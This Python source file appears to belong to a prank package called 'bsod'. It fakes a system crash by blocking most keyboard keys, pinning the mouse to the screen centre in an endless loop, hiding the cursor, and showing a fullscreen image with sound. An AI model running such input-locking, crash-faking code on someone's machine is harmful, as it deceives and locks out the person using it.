import sys
import time
import pygame
import keyboard
import pyautogui
import pkg_resources
import win32gui, win32con


def path_convertor(path):
    return pkg_resources.resource_filename('bsod', path)

def block_keyboard():
    for i in range(150):
        keyboard.block_key(i)

def block_mouse():
        screen_width, screen_height = pyautogui.size()
        disable_gesture_position = (screen_width // 2, screen_height // 2)

        while True:
            pyautogui.moveTo(disable_gesture_position)
            time.sleep(1)

def bring_window_to_top(window_title):
    hwnd = win32gui.FindWindow(None, window_title)

    if hwnd:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
    else:
        print(f"Window with title '{window_title}' not found.")

def show_error():
    pygame.init()
    
    pygame.mouse.set_visible(False)

    audio_path = path_convertor("assets/audio.mp3")
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play()

    image_path = path_convertor("assets/image.png")
    image = pygame.image.load(image_path)
    image_width, image_height = image.get_size()

    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.SWSURFACE)
    screen_width, screen_height = pygame.display.get_surface().get_size()

    scale_factor = min(screen_width / image_width, screen_height / image_height)
    scaled_width = int(image_width * scale_factor)
    scaled_height = int(image_height * scale_factor)

    x = (screen_width - scaled_width) // 2
    y = (screen_height - scaled_height) // 2

    image = pygame.transform.smoothscale(image, (scaled_width, scaled_height))


    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        screen.fill((0, 0, 0))
        screen.blit(image, (x, y))
        pygame.display.flip()

    
    print("Damn, you figured it out")
    
    pygame.quit()
    sys.exit()